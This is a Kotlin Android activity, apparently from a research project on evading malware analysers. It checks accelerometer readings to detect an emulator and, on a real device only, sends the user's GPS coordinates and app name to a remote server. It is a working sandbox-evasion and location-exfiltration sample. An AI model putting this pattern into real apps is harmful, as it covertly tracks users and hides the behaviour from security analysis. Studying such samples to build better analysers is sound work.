package nl.tbethe.shadowdroid.accelerometer

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.location.Criteria
import android.location.LocationManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "MainActivity"

class MainActivity : AppCompatActivity(), SensorEventListener {

    private lateinit var sensorManager: SensorManager
    private var sensor : Sensor? = null
    private val sensorValues = mutableListOf<FloatArray>()


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
        sensor = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)

        sensor?.let {
            sensorManager.registerListener(
                    this,
                    sensor,
                    SensorManager.SENSOR_DELAY_NORMAL
            )}

    }

    override fun onSensorChanged(event: SensorEvent?) {
        event?.let { event ->
            if (sensorValues.size >= 10) {
                // We consider the values to be emulated if one of the float arrays
                // has the same values as another array.
                val isEmu = sensorValues.foldIndexed(false) { index, bool, array ->
                    bool || sensorValues.drop(index + 1).map { otherArray ->
                        otherArray.contentEquals(array)
                    }.any { it }
                }
                leakLocationIf(!isEmu)
                sensorManager.unregisterListener(this)
            } else {
                // We do not own the event object, nor any objects inside it (like it.values).
                // These objects will be reused, so we make a copy instead.
                sensorValues.add(event.values.copyOf())
            }
        }
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {
        // intentionally left blank
    }

    private fun leakLocationIf(notAnalyser: Boolean) {
        if (!notAnalyser) return

        fun sendLocation() {
            val lm = getSystemService(LocationManager::class.java)
            val provider = lm.getBestProvider(Criteria(), true)

            val location = provider?.let {
                lm.getLastKnownLocation(it)
            }
            location?.let { loc ->
                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        HttpClient(CIO).use { client ->
                            val response = client.submitForm<HttpResponse>(
                                url,
                                Parameters.build {
                                    append("appname", packageName)
                                    append("coords", "${loc.latitude}:${loc.longitude}")
                                },
                                false
                            )
                            Log.d(TAG, "Response status: ${response.status}")
                            Log.d(TAG, "Response: ${response.readText()}")
                        }
                    } catch (e: Exception) {
                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                    }
                }
            }
        }
        val requestPermission =
            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
                if (isGranted) sendLocation()
            }
        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            PackageManager.PERMISSION_DENIED -> {
                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            PackageManager.PERMISSION_GRANTED -> {
                sendLocation()
            }
        }
    }
}